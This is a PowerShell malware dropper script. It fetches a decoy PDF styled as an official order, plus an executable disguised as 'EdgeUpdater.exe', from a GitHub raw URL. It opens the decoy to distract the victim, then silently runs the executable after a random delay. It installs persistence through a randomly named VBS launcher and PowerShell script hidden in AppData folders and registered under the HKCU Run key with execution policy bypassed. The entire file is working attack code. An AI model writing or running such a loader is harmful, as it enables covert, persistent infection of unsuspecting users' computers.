# launcher.ps1 - SIMPLE HKCU\Run + VBS only (no schtasks, no XML bullshit)
$ErrorActionPreference = 'SilentlyContinue'

function log($msg) {
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
}

log "=== LAUNCHER STARTED ==="

$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
New-Item -ItemType Directory -Path $persistBase -Force | Out-Null
New-Item -ItemType Directory -Path $cache -Force | Out-Null

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

log "Downloading PDF + EXE..."
try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}

if (Test-Path $pdfPath) {
    try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
    log "PDF opened"
}

Start-Sleep -Seconds (Get-Random -Min 20 -Max 45)

log "Launching EXE..."
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
    log "EXE launched via WScript"
} catch {
    Start-Process $exePath -WindowStyle Hidden
    log "EXE launched via fallback"
}

# SIMPLE PERSISTENCE - HKCU Run + VBS
log "Setting up simple persistence..."
$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
$vbsPath = "$persistBase\$randName.vbs"
$syncPath = "$persistBase\$randName.ps1"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 15000)
`$exeUrl = `"$exeUrl`"
`$exePath = `"$cache\helper.exe`"
if (-not (Test-Path `$exePath)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch { Start-Process `$exePath -WindowStyle Hidden }
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# Register in HKCU\Run (this is what will survive reboot)
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $randName -Value "wscript.exe `"$vbsPath`"" -Type String -Force

log "Persistence registered via HKCU Run: $randName"
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
log "Initial VBS fired - reboot now"
